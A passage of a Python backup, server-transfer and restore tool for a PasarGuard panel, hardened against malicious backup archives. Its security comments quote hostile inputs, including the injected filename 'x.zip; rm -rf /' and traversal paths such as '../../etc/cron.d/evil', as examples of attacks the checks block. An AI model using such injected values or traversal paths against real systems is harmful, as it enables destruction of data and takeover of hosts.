    prompt. Passing it via `exec -e` fixes that."""
    svc    = backend.get("container")
    user   = backend["user"] or "root"
    pwd    = backend["password"]
    dbname = backend["dbname"] or "pasarguard"

    if not svc:
        print_error("Could not identify the MySQL/MariaDB container — aborting.")
        return False

    env_flag = f"-e MYSQL_PWD={shlex.quote(pwd)} " if pwd else ""
    sql_file = "db-001.sql"
    out_path = os.path.join(db_dir, sql_file)
    print_info(f"Exporting {backend['type']} database {C.BOLD}{dbname}{C.RESET} → {sql_file}  (may take a while)")
    ok = run_command(
        f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysqldump "
        f"-u {shlex.quote(user)} --single-transaction --quick --triggers --events --routines "
        f"--hex-blob --default-character-set=utf8mb4 {shlex.quote(dbname)}",
        output_file=out_path,
        cwd=PASARGUARD_DIR,
    )
    if not ok:
        return False

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write(f"# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type={backend['type']}\n")
        mf.write(f"{dbname}\t{user}\t0\t{sql_file}\t\n")
    print_success(f"Wrote manifest for {backend['type']} database '{dbname}'.")
    return True

def _backup_sqlite_local(backend, db_dir):
    candidates = []
    if backend.get("sqlite_path"):
        candidates.append(backend["sqlite_path"])
    candidates += [
        os.path.join(PASARGUARD_DATA_DIR, "db.sqlite3"),
        os.path.join(PASARGUARD_DATA_DIR, "db.sqlite"),
    ]
    src = next((c for c in candidates if os.path.exists(c)), None)
    if not src:
        print_error(f"No SQLite database file found (tried: {', '.join(candidates)})")
        return False

    dst_name = os.path.basename(src)
    print_info(f"Copying SQLite database {src} → db_dump/{dst_name}")
    shutil.copy2(src, os.path.join(db_dir, dst_name))

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write("# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type=sqlite\n")
        mf.write(f"{os.path.splitext(dst_name)[0]}\tpasarguard\t0\t{dst_name}\t\n")
    print_success("Wrote manifest for SQLite database.")
    return True

# ── Workflow 1: Transfer to new server ───────────────────────
def _read_manifest(db_dir):
    manifest_path = os.path.join(db_dir, "manifest.tsv")
    if not os.path.exists(manifest_path):
        return None, []
    db_type = None
    entries = []
    with open(manifest_path) as f:
        for raw in f:
            line = raw.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                if "db_type=" in line:
                    for part in line.split():
                        if part.startswith("db_type="):
                            db_type = part.split("=", 1)[1]
                continue
            cols = line.split("\t")
            if len(cols) < 4:
                continue
            db       = cols[0]
            sql_file = cols[3]
            has_ts   = cols[2] == "1" if len(cols) > 2 else False
            ts_ver   = cols[4] if len(cols) > 4 else ""
            if db and sql_file:
                entries.append((db, sql_file, has_ts, ts_ver))
    if not db_type:
        if any(f.endswith(".sqlite3") or f.endswith(".sqlite") or f == "db_backup.sqlite" for _, f, _, _ in entries):
            db_type = "sqlite"
        elif os.path.exists(os.path.join(db_dir, "globals.sql")):
            db_type = "postgresql"
        elif any(f.endswith(".sql") for _, f, _, _ in entries):
            db_type = "mysql"
    return db_type, entries

# ── Per-backend restore dispatchers ──────────────────────────
def _is_safe_restore_target(path, allowed_prefix):
    """Return True if `path` (after symlink resolution) is inside
    `allowed_prefix`. v4.2.1 — defends against a malicious backup whose
    .env sets SQLALCHEMY_DATABASE_URL to a path outside /var/lib/pasarguard/
    (e.g. /etc/cron.d/evil). Without this, restoring such a backup would
    silently overwrite an arbitrary file on disk."""
    try:
        real_prefix = os.path.realpath(allowed_prefix)
        real_path   = os.path.realpath(path)
        return (real_path.startswith(real_prefix.rstrip(os.sep) + os.sep)
                or real_path == real_prefix)
    except Exception:
        return False

def _safe_extract_zip(zip_path, dest):
    """Extract `zip_path` into `dest` using Python's zipfile module, after
    validating EVERY member refuses to escape `dest` via `..`, absolute
    paths, or symlinks. v4.2.1 — replaces `unzip -q -o` because that
    command happily extracts an entry like `../../etc/cron.d/evil` straight
    to that path on disk (Zip Slip). With the script running as root, this
    was a one-backup-away RCE on the restore host."""
    import zipfile as _zipfile
    dest_real = os.path.realpath(dest)
    try:
        zf = _zipfile.ZipFile(zip_path)
    except Exception as e:
        raise ValueError(f"could not open zip {zip_path!r}: {e}")
    with zf:
        for member in zf.namelist():
            # Reject absolute paths and any entry whose joined realpath
            # would leave dest. Also reject symlinks pointing outside.
            member_path = os.path.realpath(os.path.join(dest_real, member))
            if not (member_path == dest_real
                    or member_path.startswith(dest_real + os.sep)):
                raise ValueError(f"zip-slip entry refused: {member!r}")
            info = zf.getinfo(member)
            # mode 0o12xxxx in the external_attr is a symlink; bail on those
            # too — a zip can carry symlinks that resolve outside dest.
            if (info.external_attr >> 16) & 0o170000 == 0o120000:
                raise ValueError(f"symlink entry refused: {member!r}")
        # Safe to extract.
        zf.extractall(dest_real)


def _restore_databases_remote(ssh, db_dir, remote_db_svc, backend_type=None):
    db_type, entries = _read_manifest(db_dir)
    if not entries:
        print_error("manifest.tsv not found or empty — cannot restore databases.")
        return False
    effective_type = backend_type or db_type or "postgresql"
    print_info(f"Manifest declares backend: {effective_type}  ({len(entries)} database entr{'y' if len(entries)==1 else 'ies'})")

    if effective_type in ("postgresql", "timescaledb"):
        return _restore_postgres_remote(ssh, db_dir, remote_db_svc, entries)
    if effective_type in ("mysql", "mariadb"):
        return _restore_mysql_remote(ssh, db_dir, remote_db_svc, entries)
    if effective_type == "sqlite":
        return _restore_sqlite_remote(ssh, db_dir, entries)
    print_error(f"Unsupported backend in manifest: '{effective_type}'")
    return False

def _restore_databases_local(db_dir, local_db_svc, backend_type=None):
    db_type, entries = _read_manifest(db_dir)
    if not entries:
        print_error("manifest.tsv not found or empty — cannot restore databases.")
        return False
    effective_type = backend_type or db_type or "postgresql"
    print_info(f"Manifest declares backend: {effective_type}  ({len(entries)} database entr{'y' if len(entries)==1 else 'ies'})")

    if effective_type in ("postgresql", "timescaledb"):
        return _restore_postgres_local(db_dir, local_db_svc, entries)
    if effective_type in ("mysql", "mariadb"):
        return _restore_mysql_local(db_dir, local_db_svc, entries)
    if effective_type == "sqlite":
        return _restore_sqlite_local(db_dir, entries)
    print_error(f"Unsupported backend in manifest: '{effective_type}'")
    return False

# ── PostgreSQL / TimescaleDB remote restore ───────────────────
def _restore_postgres_remote(ssh, db_dir, svc, entries):
    print_info("Restoring globals.sql (roles / tablespaces / shared grants)...")
    if not execute_ssh_command(
        ssh,
        f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/globals.sql | "
        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres",
        "Restoring globals.sql",
        required=True,
    ):
        return False

    for db, sql_file, _has_ts, _ts_ver in entries:
        # v4.2.1 — sql_file comes from manifest.tsv in the backup. Reject
        # path-traversal (`..`, `/`, `\`) before it lands in the cp/cat
        # command. shlex.quote alone would NOT stop `..` because the OS
        # still resolves it as a path component.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        ident = _ident(db)
        print_info(f"Recreating database {C.BOLD}{db}{C.RESET}...")
        execute_ssh_command(
            ssh,
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
            f"-c {shlex.quote(f'DROP DATABASE IF EXISTS {ident} WITH (FORCE);')}",
            f"Dropping old database '{db}'",
            required=False,
        )
        if not execute_ssh_command(
            ssh,
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
            f"-c {shlex.quote(f'CREATE DATABASE {ident};')}",
            f"Creating database '{db}'",
            required=True,
        ):
            return False
        print_info(f"Restoring {sql_file} → {db}  (may take a while)...")
        if not execute_ssh_command(
            ssh,
            f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
            f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d {shlex.quote(db)}",
            f"Restoring {sql_file}",
            required=True,
        ):
            return False
    return True

# ── PostgreSQL / TimescaleDB local restore ────────────────────
def _restore_postgres_local(db_dir, svc, entries):
    print_info("Restoring globals.sql (roles / tablespaces / shared grants)...")
    if not run_command(
        f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/globals.sql | "
        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres"
    ):
        print_error("Failed to restore globals.sql")
        return False

    for db, sql_file, _has_ts, _ts_ver in entries:
        # v4.2.1 — sql_file comes from manifest.tsv. Reject path traversal
        # before the path is concatenated into a cat | psql pipeline.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        ident = _ident(db)
        print_info(f"Recreating database {C.BOLD}{db}{C.RESET}...")
        run_command(
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
            f"-c {shlex.quote(f'DROP DATABASE IF EXISTS {ident} WITH (FORCE);')}"
        )
        if not run_command(
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
            f"-c {shlex.quote(f'CREATE DATABASE {ident};')}"
        ):
            print_error(f"Failed to create database '{db}'")
            return False
        print_info(f"Restoring {sql_file} → {db}  (may take a while)...")
        if not run_command(
            f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
            f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d {shlex.quote(db)}"
        ):
            print_error(f"Failed to restore {sql_file}")
            return False
    return True

# ── MySQL / MariaDB remote restore ────────────────────────────
def _restore_mysql_remote(ssh, db_dir, svc, entries):
    for db, sql_file, _, _ in entries:
        # v4.2.1 — reject path traversal in sql_file (manifest-controlled).
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        print_info(f"Restoring {db} from {sql_file}  (may take a while)...")
        ec, env_text, _ = ssh_shell(ssh, f"grep -E '^(DB_PASSWORD|MYSQL_ROOT_PASSWORD|DB_USER|DB_NAME)=' {PASARGUARD_DIR}/.env")
        env_lines = {}
        for ln in env_text.splitlines():
            if "=" in ln:
                k, v = ln.split("=", 1)
                env_lines[k.strip()] = v.strip().strip('"').strip("'")
        root_pwd = env_lines.get("MYSQL_ROOT_PASSWORD", "")
        user_pwd = env_lines.get("DB_PASSWORD", "")
        user     = env_lines.get("DB_USER", "root")

        candidates = []
        if user and user_pwd:
            candidates.append((user, user_pwd))
        if root_pwd:
            candidates.append(("root", root_pwd))

        restored = False
        for cred_user, cred_pwd in candidates:
            # v4.2 fix: MYSQL_PWD passed via `docker compose exec -e`, not
            # the SSH shell's own environment (which the container never sees).
            env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
            cmd = (
                f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
                f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysql -u {shlex.quote(cred_user)}"
            )
            ec2, _, _ = ssh_shell(ssh, cmd)
            if ec2 == 0:
                print_success(f"Restored using credentials for user '{cred_user}'.")
                restored = True
                break
        if not restored:
            print_error(f"Failed to restore {sql_file} with any known credentials.")
            return False
    return True

# ── MySQL / MariaDB local restore ─────────────────────────────
def _restore_mysql_local(db_dir, svc, entries):
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    root_pwd = env.get("MYSQL_ROOT_PASSWORD", "")
    user_pwd = env.get("DB_PASSWORD", "")
    user     = env.get("DB_USER", "root")

    candidates = []
    if user and user_pwd:
        candidates.append((user, user_pwd))
    if root_pwd:
        candidates.append(("root", root_pwd))

    for db, sql_file, _, _ in entries:
        # v4.2.1 — reject path traversal in sql_file (manifest-controlled).
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        print_info(f"Restoring {db} from {sql_file}  (may take a while)...")
        restored = False
        for cred_user, cred_pwd in candidates:
            # v4.2 fix: same MYSQL_PWD-via-exec-e fix as the remote path.
            env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
            cmd = (
                f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
                f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysql -u {shlex.quote(cred_user)}"
            )
            if run_command(cmd, quiet=True):
                print_success(f"Restored using credentials for user '{cred_user}'.")
                restored = True
                break
        if not restored:
            print_error(f"Failed to restore {sql_file} with any known credentials.")
            return False
    return True

# ── SQLite remote restore ─────────────────────────────────────
def _restore_sqlite_remote(ssh, db_dir, entries):
    for db, sql_file, _, _ in entries:
        # v4.2.1 — sql_file comes from a backup's manifest.tsv. Reject
        # path-traversal attempts (`../etc/passwd`) before concatenating
        # into the cp command. shlex.quote alone would not stop `..`
        # because the OS still resolves it.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        ec, env_text, _ = ssh_shell(ssh, f"grep -E '^SQLALCHEMY_DATABASE_URL=' {PASARGUARD_DIR}/.env")
        target = "/var/lib/pasarguard/db.sqlite3"
        if "=" in env_text:
            url = env_text.split("=", 1)[1].strip().strip('"').strip("'")
            path = url.split("://", 1)[-1].lstrip("/")
            if path and not path.startswith(":"):
                candidate = "/" + path
                # v4.2.1 — only allow restore targets under /var/lib/pasarguard/.
                # A malicious backup's .env could set SQLALCHEMY_DATABASE_URL
                # to point anywhere on disk; we refuse anything else.
                allowed_prefix = "/var/lib/pasarguard/"
                if not _is_safe_restore_target(candidate, allowed_prefix):
                    print_error(f"Refusing unsafe SQLite target {candidate!r} — must be under {allowed_prefix}.")
                    return False
                target = candidate
        print_info(f"Restoring SQLite database → {target}")
        execute_ssh_command(ssh, "cd /opt/pasarguard && docker compose stop pasarguard", "Stopping panel", required=False)
        execute_ssh_command(ssh, f"rm -f {shlex.quote(target)} {shlex.quote(target)}-wal {shlex.quote(target)}-shm", "Removing old SQLite + WAL/SHM", required=False)
        if not execute_ssh_command(
            ssh,
            f"cp {shlex.quote(db_dir)}/{shlex.quote(sql_file)} {shlex.quote(target)} && chmod 0644 {shlex.quote(target)}",
            f"Restoring SQLite file {sql_file}",
            required=True,
        ):
            return False
        execute_ssh_command(ssh, "cd /opt/pasarguard && docker compose start pasarguard", "Starting panel", required=False)
    return True

# ── SQLite local restore ──────────────────────────────────────
def _restore_sqlite_local(db_dir, entries):
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    target = "/var/lib/pasarguard/db.sqlite3"
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    if url.startswith("sqlite"):
        path = url.split("://", 1)[-1].lstrip("/")
        if path and not path.startswith(":"):
            candidate = "/" + path
            # v4.2.1 — only allow restore targets under /var/lib/pasarguard/.
            allowed_prefix = "/var/lib/pasarguard/"
            if not _is_safe_restore_target(candidate, allowed_prefix):
                print_error(f"Refusing unsafe SQLite target {candidate!r} — must be under {allowed_prefix}.")
                return False
            target = candidate

    for db, sql_file, _, _ in entries:
        # v4.2.1 — sql_file comes from manifest.tsv in the archive. A
        # malicious backup could include `../etc/passwd` here to escape
        # `db_dir`. Reject anything with path separators or traversal.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        print_info(f"Restoring SQLite database → {target}")
        run_command("cd /opt/pasarguard && docker compose stop pasarguard", quiet=True)
        run_command(f"rm -f {shlex.quote(target)} {shlex.quote(target)}-wal {shlex.quote(target)}-shm", quiet=True)
        if not run_command(
            f"cp {shlex.quote(os.path.join(db_dir, sql_file))} {shlex.quote(target)} && chmod 0644 {shlex.quote(target)}"
        ):
            print_error(f"Failed to restore SQLite file {sql_file}")
            return False
        run_command("cd /opt/pasarguard && docker compose start pasarguard", quiet=True)
    return True

def workflow_transfer():
    print_header("Auto Backup & Transfer to New Server")

    include_node = ask_backup_scope()
    zip_path = create_backup(include_node)
    if not zip_path or not os.path.exists(zip_path):
        print_error("Aborting — backup failed.")
        return

    print()
    send_tg = input(f"  {C.R2}> Send backup to Telegram first? (y/n): {C.RESET}").strip().lower()
    if send_tg == "y":
        bot_token = input(f"  {C.R2}> Bot Token: {C.RESET}").strip()
        admin_id  = input(f"  {C.R2}> Admin Chat ID: {C.RESET}").strip()
        proxy = ask_telegram_proxy()
        print_info("Uploading to Telegram...")
        cap = (f"PasarGuard {'+ PG-Node ' if include_node else ''}Manual Transfer Backup\n"
               f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        success, details = send_telegram_backup_archive(zip_path, cap, bot_token, admin_id, proxy)
        if success: print_success("Sent to Telegram!")
        else:       print_error(f"Telegram upload failed: {details}")

    print()
    print(f"  {C.R1}{C.BOLD}--- New Server Information ---{C.RESET}")
    new_ip   = input(f"  {C.R2}> New Server IP: {C.RESET}").strip()
    confirm  = input(f"  {C.R1}> User MUST be root. Confirm? (y/n): {C.RESET}").strip().lower()
    if confirm != "y":
        print_error("Root access required. Aborting.")
        return
    # v4.2: use getpass so the root password isn't echoed to the terminal
    # or left sitting in shell/screen scrollback.
    new_pass = getpass.getpass(f"  {C.R2}> Root Password: {C.RESET}").strip()

    print_info(f"Connecting to {new_ip}...")
    ssh = paramiko.SSHClient()
    # NOTE: this still auto-accepts unknown host keys (no TOFU verification
    # against a known_hosts file), which is inherently weak against a
    # man-in-the-middle on first connect. We at least surface that clearly
    # instead of doing it silently — see warning below.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print_warning("SSH host key will be trusted on first connect (no verification). "
                  "Make sure you're on a trusted network.")
    try:
        ssh.connect(hostname=new_ip, username="root", password=new_pass, timeout=10)
        print_success("Connected!")
        print()

        execute_ssh_command(ssh,
            "apt-get update >/dev/null 2>&1 && apt-get install -y unzip >/dev/null 2>&1",
            "Installing unzip")

        if include_node:
            if not stop_compose_ssh(ssh, PG_NODE_DIR, "PG-Node"):
                print_error("Could not stop PG-Node. Aborting.")
                return
        if not stop_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard"):
            print_error("Could not stop Pasarguard. Aborting.")
            return

        if not clean_dirs_ssh(ssh, include_node):
            print_error("Directory cleanup failed. Aborting.")
            return

        print_info("Uploading backup file (depends on internet speed)...")
        sftp       = ssh.open_sftp()
        zip_fn     = os.path.basename(zip_path)
        remote_zip = f"/opt/pasarguard/{zip_fn}"
        sftp.put(zip_path, remote_zip)
        sftp.chmod(remote_zip, 0o600)
        sftp.close()
        print_success("Upload completed.")

        # v4.2.1 — pre-validate the archive LOCALLY before asking the
        # remote to extract it. A malicious or tampered backup could carry
        # entries like `../../etc/cron.d/evil`; refusing up-front (rather
        # than letting the remote `unzip` write them out as root) keeps
        # the transfer host safe too. _safe_extract_zip also extracts
        # safely if we pass `extract=False`, but for the transfer path
        # we still let the remote do the extraction so any non-/opt/
        # entries surface there.
        try:
            with zipfile.ZipFile(zip_path) as _z:
                for _member in _z.namelist():
                    _target = os.path.realpath(os.path.join("/opt/pasarguard", _member))
                    if not (_target == os.path.realpath("/opt/pasarguard")
                            or _target.startswith(os.path.realpath("/opt/pasarguard") + os.sep)):
                        raise ValueError(f"zip-slip entry refused: {_member!r}")
        except (ValueError, zipfile.BadZipFile) as e:
            print_error(f"Refusing to extract archive on remote: {e}")
            return

        execute_ssh_command(ssh, f"cd /opt/pasarguard && unzip -q -o {shlex.quote(zip_fn)}",
                            "Extracting files")

        try:
            remote_backend = _detect_backend_ssh(ssh)
        except Exception as e:
            print_warning(f"Backend detection failed on remote: {e} — assuming legacy postgres")
            remote_backend = {"type": "postgresql", "container": None, "dbname": "pasarguard",
                              "user": "pasarguard", "password": "", "env": {}, "services": [],
                              "host": "127.0.0.1", "port": 5432, "sqlite_path": None}
        print_info(
            f"Detected remote backend: {C.BOLD}{remote_backend['type']}{C.RESET}  "
            f"db={remote_backend['dbname']}  container={remote_backend['container'] or '(none — sqlite)'}"
        )

        execute_ssh_command(ssh,
            "cp -a /opt/pasarguard/pasarguard_data/. /var/lib/pasarguard/ 2>/dev/null || true "
            "&& rm -rf /opt/pasarguard/pasarguard_data",
            "Restoring PasarGuard data")

        if include_node:
            execute_ssh_command(ssh,
                "cp -a /opt/pasarguard/pg_node_opt/. /opt/pg-node/ 2>/dev/null || true "
                "&& rm -rf /opt/pasarguard/pg_node_opt",
                "Restoring PG-Node config")
            execute_ssh_command(ssh,
                "cp -a /opt/pasarguard/pg_node_data/. /var/lib/pg-node/ 2>/dev/null || true "
                "&& rm -rf /opt/pasarguard/pg_node_data",
                "Restoring PG-Node data")

        if remote_backend["type"] == "sqlite":
            if not _restore_databases_remote(ssh, "db_dump", None, backend_type="sqlite"):
                print_error("SQLite restore failed. Aborting.")
                return
            if not start_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard"):
                print_error("Pasarguard did not start. Aborting.")
                return
            if include_node and not start_compose_ssh(ssh, PG_NODE_DIR, "PG-Node"):
                print_error("PG-Node did not start.")
            print_header("Transfer & Restore Completed Successfully!")
            print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") +
                          " running on the new server.")
            return

        remote_db_svc = remote_backend["container"]
        if not remote_db_svc:
            print_error(f"Could not determine the {remote_backend['type']} container for restore.")
            return

        if not start_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard DB",
                                  services=[remote_db_svc], wait_postgres=True):
            print_error(f"{remote_db_svc} did not start. Aborting.")
            return

        if not _restore_databases_remote(ssh, "db_dump", remote_db_svc, backend_type=remote_backend["type"]):
            print_error("Database restore failed. Aborting.")
            return

        if not start_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard"):
            print_error("Pasarguard did not start. Aborting.")
            return
        if include_node and not start_compose_ssh(ssh, PG_NODE_DIR, "PG-Node"):
            print_error("PG-Node did not start.")

        print_header("Transfer & Restore Completed Successfully!")
        print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") +
                      " running on the new server.")

    except paramiko.AuthenticationException:
        print_error("Incorrect server password!")
    except Exception as e:
        print_error(f"Connection error: {e}")
    finally:
        ssh.close()
        try:
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except Exception:
            pass

# ── Workflow 2: Scheduled Telegram backup ────────────────────
def run_scheduled_backup_loop(bot_token, admin_id, interval_h, include_node, proxy=None, instance=None):
    interval_s  = int(interval_h * 3600)
    scope_label = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Scheduler started  scope: {C.BOLD}{scope_label}{C.RESET}  every {interval_h}h")
    print_warning("Press Ctrl+C to stop.")
    print(hline())

    try:
        while True:
            now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write_state(instance, "backing_up", now_str)
            print(f"\n  {C.R2}[..]{C.RESET}  {C.WH}Starting scheduled backup at {now_str}...{C.RESET}")

            zip_path = create_backup(include_node)
            if zip_path and os.path.exists(zip_path):
                print_info("Uploading to Telegram...")
                cap = (f"PasarGuard {'+ PG-Node ' if include_node else ''}Auto Backup\n"
                       f"Date: {now_str}\nInterval: {interval_h}h")
                success, details = send_telegram_backup_archive(zip_path, cap, bot_token, admin_id, proxy)
                if success: print_success("Backup sent to Telegram!")
                else:       print_error(f"Send failed: {details}")
                try:
                    os.remove(zip_path)
                    print_info("Local archive removed.")
                except Exception:
                    pass
            else:
                print_error("Backup failed — skipping upload.")

            next_run = datetime.datetime.now() + datetime.timedelta(seconds=interval_s)
            write_state(instance, "sleeping", next_run.strftime("%Y-%m-%d %H:%M:%S"))
            print_info(f"Sleeping {interval_h}h... (next backup at {next_run.strftime('%Y-%m-%d %H:%M:%S')})")
            time.sleep(interval_s)

    except KeyboardInterrupt:
        write_state(instance, "stopped", "")
        print(f"\n  {C.R2}Scheduler stopped.{C.RESET}")

def workflow_backup_bot():
    print_header("Auto Backup to Telegram Bot (Scheduled)")

    include_node = ask_backup_scope()

    bot_token = input(f"  {C.R2}> Bot Token: {C.RESET}").strip()
    while not bot_token:
        bot_token = input(f"  {C.R1}Cannot be empty!{C.RESET}  {C.R2}> Bot Token: {C.RESET}").strip()

    admin_id = input(f"  {C.R2}> Admin Chat ID (numeric): {C.RESET}").strip()
    while not admin_id or not admin_id.lstrip("-").isdigit():
        admin_id = input(f"  {C.R1}Invalid!{C.RESET}  {C.R2}> Admin Chat ID: {C.RESET}").strip()

    proxy = ask_telegram_proxy()

    try:
        interval_h = float(input(f"  {C.R2}> Interval in hours (e.g. 1, 0.5): {C.RESET}").strip())
    except ValueError:
        print_warning("Invalid number. Defaulting to 1.0 hour.")
        interval_h = 1.0

    mode = ask_persistence_mode()

    if mode == "1":
        run_scheduled_backup_loop(bot_token, admin_id, interval_h, include_node, proxy)
        return

    kind_by_mode = {"2": "screen", "3": "tmux", "4": "systemd"}
    kind = kind_by_mode[mode]

    instance_name = ask_instance_name(kind)

    # v4.2: token/chat/proxy go to a 0600 credentials file instead of into
    # the daemon's CLI args (which would otherwise leak via `ps`,
    # /proc/<pid>/cmdline, and the systemd unit file). interval/include_node
    # are stored alongside them so 'Manage Backup Schedulers' can later
    # restart this exact instance or update its token without re-asking.
    write_daemon_creds(instance_name, bot_token, admin_id, proxy,
                        interval_h=interval_h, include_node=include_node)
    daemon_cmd = build_daemon_command(interval_h, include_node, instance=instance_name)

    if mode == "2":
        launch_via_screen(daemon_cmd, session_name=instance_name)
    elif mode == "3":
        launch_via_tmux(daemon_cmd, session_name=instance_name)
    elif mode == "4":
        launch_via_systemd(daemon_cmd, unit_name=instance_name)

# ── Workflow 3: Manual local backup ──────────────────────────
def workflow_manual_backup():
    print_header("Manual Backup (Local)")

    include_node = ask_backup_scope()
    zip_path = create_backup(include_node)
    if zip_path and os.path.exists(zip_path):
        print_success(f"Backup saved: {zip_path}")
    else:
        print_error("Manual backup failed!")

# ── Workflow 4: Manual local restore ─────────────────────────
_SAFE_FILENAME_RE = None

def _is_safe_filename(name):
    """v4.2: validate the user-supplied backup filename before it ever
    touches a shell=True command. Only allow a plain filename (letters,
    digits, dot, dash, underscore) with no path separators — blocks both
    shell metacharacter injection and path traversal (../../etc)."""
    import re
    global _SAFE_FILENAME_RE
    if _SAFE_FILENAME_RE is None:
        _SAFE_FILENAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")
    return bool(name) and "/" not in name and ".." not in name and bool(_SAFE_FILENAME_RE.match(name))

def workflow_manual_restore():
    print_header("Manual Restore (Local)")

    include_node = ask_backup_scope()
    scope_label  = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Scope: {C.BOLD}{scope_label}{C.RESET}")

    zip_name = input(
        f"  {C.R2}> Backup ZIP filename (e.g. backup_full_20260101.zip): {C.RESET}"
    ).strip()

    # v4.2 — SECURITY FIX: this filename used to be interpolated directly
    # into a `shell=True` unzip command with no quoting/validation, which
    # allowed arbitrary shell command injection (e.g. entering
    # "x.zip; rm -rf /") to run as root. Validate it strictly before doing
    # anything else with it.
    if not _is_safe_filename(zip_name):
        print_error("Invalid filename — only letters, digits, '.', '-', '_' are allowed "
                     "(no paths, no shell characters).")
        return

    zip_name = _join_chunks_if_needed(zip_name)
    if not zip_name or not _is_safe_filename(zip_name) or not os.path.exists(zip_name):
        print_error(f"File '{zip_name}' not found in current directory.")
        return

    confirm = input(
        f"  {C.R1}> WARNING: This will overwrite current config and database. Continue? (y/n): {C.RESET}"
    ).strip().lower()
    if confirm != "y":
        print_warning("Aborted.")
        return

    try:
        if include_node and not stop_compose_local(PG_NODE_DIR, "PG-Node"):
            print_error("Could not stop PG-Node. Aborting.")
            return
        if not stop_compose_local(PASARGUARD_DIR, "Pasarguard"):
            print_error("Could not stop Pasarguard. Aborting.")
            return

        if not clean_dirs_local(include_node):
            print_error("Directory cleanup failed. Aborting.")
            return

        print_info("Extracting backup archive...")
        # v4.2.1 — extract via Python's zipfile module after validating
        # every member against path-traversal (Zip Slip). A malicious
        # archive could carry entries like `../../etc/cron.d/evil` that
        # `unzip -o` would write straight to that path as root.
        try:
            _safe_extract_zip(zip_name, "/opt/pasarguard")
        except (ValueError, zipfile.BadZipFile) as e:
            print_error(f"Refusing to extract archive: {e}")
            return
        except Exception as e:
            print_error(f"Extraction failed: {e}")
            return

        print_info("Restoring PasarGuard data...")
        run_command("cp -a /opt/pasarguard/pasarguard_data/. /var/lib/pasarguard/ 2>/dev/null || true")
        run_command("rm -rf /opt/pasarguard/pasarguard_data")

        if include_node:
            print_info("Restoring PG-Node config and data...")
            run_command("cp -a /opt/pasarguard/pg_node_opt/. /opt/pg-node/ 2>/dev/null || true")
            run_command("cp -a /opt/pasarguard/pg_node_data/. /var/lib/pg-node/ 2>/dev/null || true")
            run_command("rm -rf /opt/pasarguard/pg_node_opt /opt/pasarguard/pg_node_data")

        try:
            backend = _detect_backend_local()
        except Exception as e:
            print_warning(f"Backend detection failed: {e} — assuming legacy postgres")
            backend = {"type": "postgresql", "container": None, "dbname": "pasarguard",
                       "user": "pasarguard", "password": "", "env": {}, "services": [],
                       "host": "127.0.0.1", "port": 5432, "sqlite_path": None}
        print_info(
            f"Detected backend: {C.BOLD}{backend['type']}{C.RESET}  "
            f"db={backend['dbname']}  container={backend['container'] or '(none — sqlite)'}"
        )

        if backend["type"] == "sqlite":
            if not _restore_databases_local("db_dump", None, backend_type="sqlite"):
                raise Exception("SQLite restore failed.")
            if not start_compose_local(PASARGUARD_DIR, "Pasarguard"):
